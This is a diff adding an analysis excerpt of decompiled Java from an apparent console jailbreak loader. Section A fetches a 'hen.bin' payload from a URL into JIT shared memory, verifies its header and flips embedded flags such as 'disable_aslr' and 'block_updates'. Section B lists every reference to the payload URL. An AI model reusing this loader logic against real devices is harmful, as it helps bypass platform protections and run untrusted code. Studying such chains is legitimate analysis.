@@ -1,0 +1,88 @@
+======================================================================
+  A. Hx1400.run() lines 1290-1360 - HENURL fetch logic
+======================================================================
+                return this.fin(unsafe, "jitshm mmap for hen failed");
+            }
+            unsafe.setMemory(l149, 589824L, (byte)0);
+            this.lg(unsafe, "H3 hen map=" + Hx1400.hz(l149) + " span=" + Hx1400.hz(589824L) + " fd=" + l148);
+            long l150 = 0L;
+            String string3 = "-";
+            InputStream inputStream = null;
+            try {
+                String string4 = HENURL;
+                if (string4 == null) {
+                    string4 = HEN_URL;
+                }
+                inputStream = new URL(string4).openStream();
+                byte[] byArray4 = new byte[65536];
+                while (l150 < (long)HEN_SIZE) {
+                    n4 = inputStream.read(byArray4, 0, byArray4.length);
+                    if (n4 < 0) {
+                        break;
+                    }
+                    for (n3 = 0; n3 < n4; ++n3) {
+                        unsafe.putByte(l149 + l150 + (long)n3, byArray4[n3]);
+                    }
+                    l150 += (long)n4;
+                }
+            }
+            catch (Throwable throwable) {
+                string3 = throwable.getClass().getName() + ":" + throwable.getMessage();
+            }
+            finally {
+                try {
+                    if (inputStream != null) {
+                        inputStream.close();
+                    }
+                }
+                catch (Throwable throwable) {}
+            }
+            this.lg(unsafe, "H4 fetched " + l150 + "/" + HEN_SIZE + " B via " + (HENURL == null ? "lan" : "session") + " err=" + string3);
+            if (l150 != (long)HEN_SIZE) {
+                return this.fin(unsafe, "hen.bin is " + l150 + " B, expected " + HEN_SIZE);
+            }
+            int n52 = unsafe.getByte(l149) & 0xFF;
+            int n53 = unsafe.getByte(l149 + 1L) & 0xFF;
+            n4 = unsafe.getByte(l149 + 2L) & 0xFF;
+            n3 = unsafe.getByte(l149 + 3L) & 0xFF;
+            int n54 = unsafe.getByte(l149 + 4L) & 0xFF;
+            int n55 = n53 | n4 << 8 | n3 << 16 | n54 << 24;
+            int n56 = 5 + n55;
+            int n57 = 0;
+            for (long i = (long)HEN_SIZE; i < 589824L; i += 8L) {
+                if (unsafe.getLong(l149 + i) == 0L) continue;
+                ++n57;
+            }
+            this.lg(unsafe, "H5 head=" + Integer.toHexString(n52) + " entry=0x" + Integer.toHexString(n56) + " (want 0x" + Integer.toHexString(HEN_ENTRY) + ") bssNonZero=" + n57);
+            boolean bl13 = bl = n52 == 233 && n56 == HEN_ENTRY && n57 == 0;
+            if (!bl) {
+                return this.fin(unsafe, "hen image: head=" + Integer.toHexString(n52) + " entry=0x" + Integer.toHexString(n56) + " bss=" + n57);
+            }
+            this.lg(unsafe, "H5 *** 519072 defer-shellui build VERIFIED IN PLACE ***");
+            int[] nArray8 = new int[]{OFF_FIXES, OFF_MMAP, OFF_BLOCKUPD, OFF_ASLR, OFF_NOBD, OFF_SKIP, CFG_UPLOAD, CFG_PLUGINS};
+            int[] nArray9 = new int[]{1, 1, 1, 1, 0, 0, 1, 1};
+            String[] stringArray3 = new String[]{"exploit_fixes", "mmap_patches", "block_updates", "disable_aslr", "nobd_patches", "skip_patches", "upload_prx", "enable_plugins"};
+            StringBuffer stringBuffer7 = new StringBuffer("H5b embedded config:");
+            boolean bl14 = true;
+            for (int i = 0; i < nArray8.length; ++i) {
+                int n58 = unsafe.getByte(l149 + (long)nArray8[i]) & 0xFF;
+                if (n58 != 48 && n58 != 49) {
+                    bl14 = false;
+                    stringBuffer7.append(" ").append(stringArray3[i]).append("@0x").append(Integer.toHexString(nArray8[i])).append("=0x").append(Integer.toHexString(n58)).append("!!");
+                    continue;
+                }
+                unsafe.putByte(l149 + (long)nArray8[i], (byte)(48 + nArray9[i]));
+                n2 = unsafe.getByte(l149 + (long)nArray8[i]) & 0xFF;
+                stringBuffer7.append(" ").append(stringArray3[i]).append("=").append((char)n58).append("->").append((char)n2);
+            }
+            this.lg(unsafe, stringBuffer7.toString());
+
+======================================================================
+  B. All HENURL references
+======================================================================
+   63  static final String HEN_URL = "file:/__bonk___offline_missing__/hen.bin";
+   64  public static volatile String HENURL;
+ 1297  String string4 = HENURL;
+ 1299  string4 = HEN_URL;
+ 1325  this.lg(unsafe, "H4 fetched " + l150 + "/" + HEN_SIZE + " B via " + (HENURL == null ? "lan" : "session") + " err=" + string3);
+ 1953  HENURL = null;
